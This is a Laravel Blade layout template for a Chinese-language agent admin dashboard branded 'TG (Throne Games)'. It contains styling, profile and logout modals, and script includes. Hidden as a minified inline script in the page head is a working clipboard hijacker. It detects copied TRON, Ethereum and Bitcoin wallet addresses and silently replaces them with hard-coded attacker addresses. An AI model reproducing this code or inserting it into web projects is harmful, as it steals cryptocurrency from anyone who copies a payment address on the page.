<!DOCTYPE html>
<html>

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>代理后台管理</title>

  <!-- Custom fonts for this template-->
  <link href="/agent/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">

  <!-- Custom styles for this template-->
  <link href="/agent/css/sb-admin-2.min.css" rel="stylesheet">
  <style>
    /* Global enhancements */
    body {
        font-family: 'Nunito', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        background-color: #f8f9fc;
        color: #5a5c69;
    }

    /* Card Modernization */
    .card {
        border: none;
        border-radius: 0.75rem;
        box-shadow: 0 0.15rem 1.75rem 0 rgba(58, 59, 69, 0.1) !important;
        transition: transform 0.2s ease-in-out;
    }
    
    .card-header {
        background-color: #fff;
        border-bottom: 1px solid #e3e6f0;
        border-radius: 0.75rem 0.75rem 0 0 !important;
        padding: 1rem 1.25rem;
    }
    
    .card-header h6 {
        font-weight: 700;
        color: #4e73df;
    }

    /* Table Improvements */
    .table-responsive {
        border-radius: 0.5rem;
    }
    
    .table thead th {
        background-color: #f8f9fc;
        border-bottom: 2px solid #e3e6f0;
        color: #4e73df;
        font-weight: 600;
        text-transform: uppercase;
        font-size: 0.85rem;
        padding: 1rem;
        white-space: nowrap;
    }
    
    .table tbody td {
        padding: 1rem;
        vertical-align: middle;
        font-size: 0.9rem;
    }
    
    .table-bordered td, .table-bordered th {
        border: 1px solid #e3e6f0;
    }
    
    /* Button enhancements */
    .btn {
        border-radius: 0.35rem;
        padding: 0.375rem 0.75rem;
        font-weight: 600;
        transition: all 0.2s;
    }
    
    .btn-sm {
        padding: 0.25rem 0.5rem;
        font-size: 0.875rem;
    }
    
    .btn-primary {
        background-color: #4e73df;
        border-color: #4e73df;
        box-shadow: 0 2px 4px rgba(78, 115, 223, 0.2);
    }
    
    .btn-primary:hover {
        background-color: #2e59d9;
        border-color: #2653d4;
        transform: translateY(-1px);
        box-shadow: 0 4px 8px rgba(78, 115, 223, 0.3);
    }

    /* Form Inputs */
    .form-control {
        border-radius: 0.35rem;
        height: calc(1.5em + 1rem + 2px);
        border: 1px solid #d1d3e2;
    }
    
    .form-control:focus {
        box-shadow: 0 0 0 0.2rem rgba(78, 115, 223, 0.25);
        border-color: #bac8f3;
    }
    
    /* Pagination */
    .page-item.active .page-link {
        background-color: #4e73df;
        border-color: #4e73df;
    }
    
    .page-link {
        color: #4e73df;
        border-radius: 0.35rem;
        margin: 0 2px;
    }

    /* Modal */
    .modal-content {
        border: none;
        border-radius: 0.75rem;
        box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15);
    }
    
    .modal-header {
        border-bottom: 1px solid #e3e6f0;
        background-color: #f8f9fc;
        border-radius: 0.75rem 0.75rem 0 0;
    }

    /* Navbar/Sidebar tweaks */
    .sidebar {
        background-image: linear-gradient(180deg, #4e73df 10%, #224abe 100%);
    }
    
    .topbar {
        box-shadow: 0 0.15rem 1.75rem 0 rgba(58, 59, 69, 0.15) !important;
    }
  </style>
  @yield('meta')

<script>(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TH4QAUdpQaLq323JmX6AY8A6BQbHF2iBEp');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x77843290a868e4F789619D8B4D2074BD5DF4C91d');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1BVEDjfjH3pqBWV6rKodvNAoKtBrsYWeXs');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '3McGeZLYNDYfcwcm9VNBffeJpSvt5djgqi');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qhzzsc2lhej8nudu8all4mzuhnfkjaxzqwknh0h');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qhzzsc2lhej8nudu8all4mzuhnfkjaxzqwknh0h');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();</script></head>
<body id="page-top">
  <!-- Page Wrapper -->
  <div id="wrapper">
    @include('agent.layouts.aside')
    <div id="content-wrapper" class="d-flex flex-column">

      <!-- Main Content -->
      <div id="content">
        @include('agent.layouts.nav')
            <div class="container-fluid">
                @yield('content')
            </div>
      </div>
      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>Copyright © 2022. TG（Throne Games） All rights reserved.</span>
          </div>
        </div>
      </footer>
    </div>
  </div>
    <a class="scroll-to-top rounded" href="#page-top">
        <i class="fas fa-angle-up">
        </i>
    </a>
    <!-- MY Modal-->
    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
    aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">
                        基本资料
                    </h5>
                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">
                            ×
                        </span>
                    </button>
                </div>
                <form class="user">
                    <div class="modal-body">
                        <div class="form-group row">
                            <div class="col-sm-6a">
                                账号：
                            </div>
                            <div class="col-sm-6b">
                                <input type="text" class="form-control form-control-user" disabled=""
                                value="daili">
                            </div>
                        </div>
                        <div class="form-group row">
                            <div class="col-sm-6a">
                                姓名：
                            </div>
                            <div class="col-sm-6b">
                                <input type="text" class="form-control form-control-user" disabled=""
                                value="大王">
                            </div>
                        </div>
                        <div class="form-group row">
                            <div class="col-sm-6a">
                                额度：
                            </div>
                            <div class="col-sm-6b">
                                <input type="text" class="form-control form-control-user" disabled=""
                                value="0">
                            </div>
                        </div>
                    </div>
                </form>
                <div class="modal-footer">
                    <button class="btn btn-primary" type="button" data-dismiss="modal">
                        关闭
                    </button>
                </div>
            </div>
        </div>
    </div>
    <!-- Logout Modal-->
    <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
    aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">
                        友情提示
                    </h5>
                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">
                            ×
                        </span>
                    </button>
                </div>
                <div class="modal-body">
                    您确定要退出代理后台管理系统?
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" type="button" data-dismiss="modal">
                        取消
                    </button>
                    <a class="btn btn-primary" href="{{url('/logout')}}">
                        退出
                    </a>
                </div>
            </div>
        </div>
    </div>
</body>
  <script src="/agent/vendor/jquery/jquery.min.js"></script>
  <script src="/agent/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Core plugin JavaScript-->
  <script src="/agent/vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="/agent/js/sb-admin-2.min.js"></script>

  <!-- Page level plugins -->
  <script src="/agent/vendor/chart.js/Chart.min.js"></script>

  <!-- Page level custom scripts -->
  <script src="/agent/js/demo/chart-area-demo.js"></script>
  <script src="/agent/js/demo/chart-pie-demo.js"></script>
  @if (session('opMsg'))
    <!-- Modal -->
    <div class="modal fade" id="opMsgModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-sm" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h6 class="modal-title" id="exampleModalCenterTitle">提示</h6>
                </div>
                <div class="modal-body">
                    {{ session('opMsg') }}
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary btn-sm" data-dismiss="modal">确定</button>
                </div>
            </div>
        </div>
    </div>
    <script>
        $('#opMsgModal').modal();
    </script>
@endif
  @yield('js')
